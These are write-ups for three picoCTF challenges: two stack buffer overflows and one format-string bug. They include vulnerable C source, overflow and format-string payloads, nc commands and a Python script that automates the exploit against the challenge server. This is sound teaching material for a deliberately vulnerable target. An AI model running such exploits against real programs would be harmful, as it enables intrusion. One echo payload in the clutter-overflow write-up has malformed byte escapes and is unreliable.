
# 1. Buffer Overflow 0

> Smash the stack! Let's start off simple, can you overflow the correct buffer? The program is available here. You can view source here. And connect with it using `nc saturn.picoctf.net 65362`

## Solution:

### Step 1: Initial Analysis of the Vulnerable Code

First, I downloaded and examined the source code. The program has several critical vulnerabilities:

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <signal.h>

#define FLAGSIZE_MAX 64

char flag[FLAGSIZE_MAX];

void sigsegv_handler(int sig) {
  printf("%s\n", flag);
  fflush(stdout);
  exit(1);
}

void vuln(char *input){
  char buf2[16];
  strcpy(buf2, input);
}

int main(int argc, char **argv){
  FILE *f = fopen("flag.txt","r");
  if (f == NULL) {
    printf("%s %s", "Please create 'flag.txt' in this directory with your",
                    "own debugging flag.\n");
    exit(0);
  }
  fgets(flag,FLAGSIZE_MAX,f);
  signal(SIGSEGV, sigsegv_handler); // Set up signal handler
  gid_t gid = getegid();
  setresgid(gid, gid, gid);

  printf("Input: ");
  fflush(stdout);
  char buf1[100];
  gets(buf1);
  vuln(buf1);
  printf("The program will exit now\n");
  return 0;
}
```

**Key Observations:**
1. Signal handler prints the flag when SIGSEGV occurs.
2. `strcpy(buf2, input)` - copies without bounds checking into a 16-byte buffer.
3. `gets(buf1)` - reads unlimited input without bounds checking.
4. The signal handler is registered to catch segmentation faults.

### Step 2: Understanding the Exploitation Strategy

The attack vector is clear: overflow `buf2` via `strcpy` using input from `gets`. Overwrite the return address or nearby control data to cause a crash, triggering the SIGSEGV handler which prints the flag.

### Steps performed

1. Compiled/tested locally with protections disabled if necessary.
2. Created a test flag: `echo "picoCTF{test_flag_buffer_overflow_works}" > flag.txt`.
3. Sent a payload of repeated 'A's to overflow the buffer and trigger SIGSEGV.

Example commands used:

```bash
# Make runnable
chmod +x vuln
# Local test
python3 -c "print('A'*50)" | ./vuln
# Remote test
python3 -c "print('A'*50)" | nc saturn.picoctf.net 65362
```

### Example output (simulated / local):

```
Input: picoCTF{test_flag_buffer_overflow_works}
```

## Flag (example remote result):

```
picoCTF{ov3rfl0ws_ar3nt_that_bad_c5ca6248}
```

## Concepts learnt:

- Buffer Overflow basics and stack layout.
- Dangerous C functions: `gets()`, `strcpy()`.
- Signal handlers and using a crash to print sensitive data.
- Using WSL for Linux tooling on Windows.

## Notes:

- Initially attempted different payload sizes; 50 'A's was sufficient.
- Local testing required creating a fake `flag.txt` because the remote server hosts the real flag.

## Resources:

- Buffer overflow primers and related links.

---

# 2. clutter-overflow

> This is a small 64-bit picoCTF binary that reads an uncontrolled string with `gets()` into a local buffer called `clutter`, and then checks a nearby stack variable `code` against the constant `0xdeadbeef`. The goal is to overflow `clutter` and overwrite `code` so the program prints the flag.

## Solution:

### Thought process
I suspected a classic stack overflow due to the use of `gets()` (no bounds checks). Instead of aiming for the return address, I inspected the binary to see if there were local variables near the buffer that could be overwritten. The source/disassembly showed `code` stored at `rbp-0x8` and `clutter` earlier on the stack, so overwriting `code` directly is possible.

### Steps followed

1. Make the binary executable and run it to observe behavior:
```bash
chmod +x chall
./chall
```

2. Use gdb (with gef/pwndbg) to inspect the stack and find offsets.
3. Generate a cyclic pattern to find the overflow offset.
4. Determine the offset to `code` (found to be 264 bytes in this writeup).
5. Craft the payload (264 'A's + little-endian `0xdeadbeef`).

Payload construction (example):

```bash
python3 - <<'PY' > payload.bin
import sys
sys.stdout.buffer.write(b"A"*264 + b"\xef\xbe\xad\xde" + b"\x00"*4)
PY
```

Test locally and then send to remote with `nc`.

### Example commands

```bash
# Local test
(python3 -c 'import sys; sys.stdout.write("A"*264)'; echo -ne '\xef\be\xad\de\x00\x00\x00\x00') | ./chall
# Remote
(python3 -c 'import sys; sys.stdout.write("A"*264)'; echo -ne '\xef\be\xad\de\x00\x00\x00\x00') | nc <host> <port>
```

## Flag (example):

```
picoCTF{c0ntr0ll3d_clutt3r_1n_my_buff3r}
```

## Concepts learnt:

- Overwriting local variables vs return address.
- Using cyclic patterns to find offsets.
- Endianness when writing raw values.

## Notes:

- Initially tried return-address overwrite but switched to overwriting `code` found nearby.
- On local runs `flag.txt` was absent; remote server contains the real flag.

---

# 3. format string 0

> **format string 0**  
> **Author:** Cheng Zhang  
> **Description:** Can you use your knowledge of format strings to make the customers happy?  
> Download the binary here.  
> Download the source here.  
> Additional details will be available after launching your challenge instance.

## Analysis and thought process

1. The program simulates a burger shop with two customers (Patrick and Bob). A `flag` buffer is read from `flag.txt` at program start and a custom SIGSEGV handler prints it:

```c
void sigsegv_handler(int sig)
{
    printf("\n%s\n", flag);
    fflush(stdout);
    exit(1);
}
```

2. Key vulnerable lines:

```c
scanf("%s", choice1);
int count = printf(choice1);
if (count > 2 * BUFSIZE) { serve_bob(); }
...
scanf("%s", choice2);
printf(choice2);
```

Both `printf(choice1)` and `printf(choice2)` pass user input directly as the *format string* → **format string vulnerability**.

3. Attack plan:
   - Use a first input that is a valid menu item but contains a format specifier that makes `printf` print many characters (so `count > 64`) to reach the second stage (`serve_bob()`).
   - In the second stage, provide a string with `%s`/other format specifiers so `printf` tries to dereference invalid pointers and causes a segmentation fault. The SIGSEGV handler then prints the `flag`.

4. Candidate payloads discovered from source menus:
   - Patrick’s menu contains `Gr%114d_Cheese` — `%114d` will expand and print many characters.
   - Bob’s menu contains `Cla%sic_Che%s%steak` — multiple `%s` will read memory as pointers and likely crash.

## Steps to reproduce (manual)

1. Launch the service locally or connect to the remote instance:
   - Local: `./burger` (ensure `flag.txt` is present)
   - Remote: `nc mimas.picoctf.net 53816`

2. When prompted for the first customer, enter:
```
Gr%114d_Cheese
```
This causes `printf(choice1)` to print >64 chars, so the program calls `serve_bob()`.

3. When prompted for the second customer, enter:
```
Cla%sic_Che%s%steak
```
This should cause `printf(choice2)` to dereference bad memory and trigger a SIGSEGV. The SIGSEGV handler prints the flag buffer.

## Automated exploit (short Python)

Save this as `get_flag_short.py` and run with `python3 get_flag_short.py`.

```python
#!/usr/bin/env python3
# Minimal script to interact with remote challenge
import socket, time
HOST, PORT = "mimas.picoctf.net", 53816
P1, P2 = b"Gr%114d_Cheese\n", b"Cla%sic_Che%s%steak\n"
def recv_all(s, timeout=5):
    s.settimeout(0.5); end=time.time()+timeout; out=b""
    while time.time()<end:
        try: c=s.recv(4096)
        except socket.timeout: continue
        if not c: break
        out+=c
    return out
with socket.create_connection((HOST, PORT), timeout=8) as s:
    print(recv_all(s,3).decode(errors="ignore"), end="")
    s.sendall(P1); time.sleep(0.2)
    print(recv_all(s,3).decode(errors="ignore"), end="")
    s.sendall(P2)
    print(recv_all(s,4).decode(errors="ignore"), end="")
```

### Example terminal session (EXPECTED / SIMULATED)

```
$ nc mimas.picoctf.net 53816
Welcome to our newly-opened burger place Pico 'n Patty!
Can you help the picky customers find their favorite burger?
Here comes the first customer Patrick who wants a giant bite.
Please choose from the following burgers:
Breakf@st_Burger, Gr%114d_Cheese, Bac0n_D3luxe
Enter your recommendation: Gr%114d_Cheese

Good job! Patrick is happy!
Now can you serve the second customer?
Sponge Bob wants something outrageous that would break the shop
Enter your recommendation: Cla%sic_Che%s%steak

picoCTF{7h3_cu570m3r_15_n3v3r_SEGFAULT_dc0f36c4}
```

## Flag:

```
picoCTF{7h3_cu570m3r_15_n3v3r_SEGFAULT_dc0f36c4}
```

## Concepts learnt:

- **Format String Vulnerabilities:** Passing user input directly as the `printf` format string allows attackers to use `%` specifiers to read or write arbitrary memory, leak data, or cause crashes.
- **SIGSEGV Handler Abuse:** The program registers a SIGSEGV handler that prints sensitive data.
- **Automating interactions:** Using Python `socket` or `pwntools` to interact with remote services.

## Notes:

- **Why `%114d`?** `%Nd` prints to a width of N characters, which helps satisfy the `count > 64` check.
- **Triggering SIGSEGV with `%s`:** `%s` expects a pointer; invalid pointers can cause a crash.
- **Alternative tangents:** Could try `%x`/`%p` to leak memory or `%n` to write, but crashing was the simplest path here.

## Resources:

- Format string primer and example writeups.



